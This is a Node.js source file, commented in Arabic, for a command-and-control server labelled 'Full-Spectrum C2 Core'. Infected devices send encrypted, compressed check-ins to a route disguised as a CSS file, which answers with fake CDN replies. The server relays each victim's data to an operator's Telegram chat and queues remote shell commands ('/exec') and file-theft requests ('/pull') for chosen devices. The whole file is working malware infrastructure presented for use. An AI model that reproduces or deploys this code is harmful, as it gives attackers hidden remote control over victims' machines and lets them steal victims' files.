// app.js - النسخة الشاملة المطلقة (Full-Spectrum C2 Core)
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const zlib = require('zlib');

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;
const MASTER_SECRET = process.env.AGENT_SECRET || 'BaseSystemZeroDaySecureKey2026';

if (!token || !chatId) {
    console.error('[-] خطأ حرج: متغيرات البيئة غير مكتملة.');
    process.exit(1);
}

const app = express();
const appBot = new telegramBot(token, { polling: true });

const activeNodes = new Map();
const commandQueues = new Map();

app.use(express.text({ type: '*/*', limit: '50mb' }));

const secretBuffer = Buffer.from(MASTER_SECRET, 'utf8');
const CRYPTO_KEY = Buffer.alloc(32);
secretBuffer.copy(CRYPTO_KEY, 0, 0, Math.min(secretBuffer.length, 32));

function processIncomingPayload(base64String) {
    try {
        const rawJson = Buffer.from(base64String, 'base64').toString('utf8');
        const packet = JSON.parse(rawJson);
        
        const iv = Buffer.from(packet.v, 'hex');
        const authTag = Buffer.from(packet.g, 'hex');
        const encryptedData = Buffer.from(packet.d, 'hex');

        const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, iv);
        decipher.setAuthTag(authTag);
        
        let decryptedBuffer = decipher.update(encryptedData);
        decryptedBuffer = Buffer.concat([decryptedBuffer, decipher.final()]);

        const decompressedData = zlib.gunzipSync(decryptedBuffer).toString('utf8');
        return JSON.parse(decompressedData);
    } catch (e) {
        return null;
    }
}

// مسار استقبال النبضات وبيانات التنفيذ
app.post('/assets/web/style-min.css', async (req, res) => {
    try {
        const agentModel = req.headers['x-agent-model'] || 'Unknown-Node';
        const agentId = req.headers['x-agent-id'] || 'Secure-Target';

        activeNodes.set(agentId, { model: agentModel, lastSeen: Date.now() });

        const payload = processIncomingPayload(req.body);
        if (!payload) {
            return res.status(200).send('/* CDN Sync OK */');
        }

        // جلب الأوامر المعلقة للجهاز
        let responsePayload = '/* Synchronized */';
        if (commandQueues.has(agentId) && commandQueues.get(agentId).length > 0) {
            const nextCmd = commandQueues.get(agentId).shift();
            responsePayload = JSON.stringify({ directive: nextCmd });
        }

        let alertMsg = `🚀 <b>تحديث هيكلي من العقدة [${agentId}]:</b>\n`;
        alertMsg += `<pre>${JSON.stringify(payload, null, 2)}</pre>`;
        
        await appBot.sendMessage(chatId, alertMsg, { parse_mode: 'HTML' });
        res.status(200).send(responsePayload);
    } catch (err) {
        res.sendStatus(200);
    }
});

// أوامر تليجرام للسيطرة الشاملة
appBot.on('message', async (msg) => {
    const text = msg.text;
    if (String(msg.chat.id) !== String(chatId)) return;

    if (text === '/nodes') {
        if (activeNodes.size === 0) {
            await appBot.sendMessage(chatId, '📭 لا توجد عقد نشطة حالياً.');
        } else {
            let report = '🛡️ <b>الأنودات المتصلة بالشبكة:</b>\n\n';
            activeNodes.forEach((node, id) => {
                report += `📱 الموديل: ${node.model}\n🆔 ID: <code>${id}</code>\n\n`;
            });
            await appBot.sendMessage(chatId, report, { parse_mode: 'HTML' });
        }
    }
    else if (text.startsWith('/exec')) {
        const parts = text.split(' ');
        if (parts.length < 3) {
            await appBot.sendMessage(chatId, '⚠️ الصيغة الصحيحة: <code>/exec [ID] [الأمر]</code>', { parse_mode: 'HTML' });
            return;
        }
        const targetId = parts[1];
        const cmd = parts.slice(2).join(' ');

        if (!commandQueues.has(targetId)) commandQueues.set(targetId, []);
        commandQueues.get(targetId).push({ type: 'SHELL', command: cmd });
        await appBot.sendMessage(chatId, `✅ تم جدولة أمر الشل للعقدة <code>${targetId}</code>: <code>${cmd}</code>`, { parse_mode: 'HTML' });
    }
    else if (text.startsWith('/pull')) {
        const parts = text.split(' ');
        if (parts.length < 3) {
            await appBot.sendMessage(chatId, '⚠️️ الصيغة الصحيحة: <code>/pull [ID] [مسار الملف]</code>', { parse_mode: 'HTML' });
            return;
        }
        const targetId = parts[1];
        const filePath = parts[2];

        if (!commandQueues.has(targetId)) commandQueues.set(targetId, []);
        commandQueues.get(targetId).push({ type: 'PULL_FILE', path: filePath });
        await appBot.sendMessage(chatId, `📂 تم طلب سحب الملف من العقدة <code>${targetId}</code>: <code>${filePath}</code>`, { parse_mode: 'HTML' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Full-Spectrum C2 Core Active on Port ${PORT}`);
});
